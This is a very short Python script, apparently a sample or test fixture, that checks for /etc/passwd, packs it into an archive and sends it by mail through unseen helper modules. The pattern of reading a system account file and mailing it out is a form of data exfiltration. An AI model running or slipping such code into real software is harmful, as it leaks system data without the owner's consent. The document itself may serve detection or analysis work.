#!/usr/bin/env python3

from helpers.mailing import sendmail
import helpers.filesystem


helpers.filesystem.file_exists('/etc/passwd')
helpers.filesystem.create_archive(['/etc/passwd'])

sendmail.send()

